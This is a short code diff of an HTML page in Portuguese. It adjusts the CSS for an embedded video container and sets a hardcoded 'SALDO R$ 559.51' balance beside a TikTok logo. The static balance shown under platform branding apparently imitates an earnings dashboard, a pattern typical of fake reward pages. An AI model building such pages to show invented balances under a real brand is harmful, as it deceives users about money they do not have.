@@ -92,8 +92,9 @@
 
         #video-container {
             width: 100%;
-            padding-top: 56.25%; /* Mantém a proporção 16:9 */
-            position: relative;
+            max-width: 400px;
+            aspect-ratio: 16/9; /* Mantém a proporção 16:9 */
+            margin: 0 auto;
             margin-bottom: 20px;
             overflow: hidden;
             border: 2px solid #ff0150;
@@ -101,11 +102,9 @@
         }
 
         #video-container iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
+            border: none;
         }
 
         /* Botão */
@@ -136,9 +135,9 @@
         document.addEventListener("DOMContentLoaded", function () {
             // Define o valor inicial do saldo
             const saldoAtualizado = document.querySelector(".saldoAtualizado");
-            saldoAtualizado.textContent = "559.51"; // Valor do saldo inicial
-
-            // Função adicional pode ser incluída para manipular ações baseadas no saldo
+            if (saldoAtualizado) {
+                saldoAtualizado.textContent = "559.51"; // Valor do saldo inicial
+            }
         });
     </script>
 </head>
@@ -152,7 +151,7 @@
         <img id="logo" src="images/tiktoklogo.svg" alt="TikTok Logo">
         <div class="boxSaldo">
             <span class="textoSaldo">SALDO</span>
-            <span class="valorSaldo">R$ <span class="saldoAtualizado"></span></span>
+            <span class="valorSaldo">R$ <span class="saldoAtualizado">559.51</span></span>
         </div>
     </div>
 
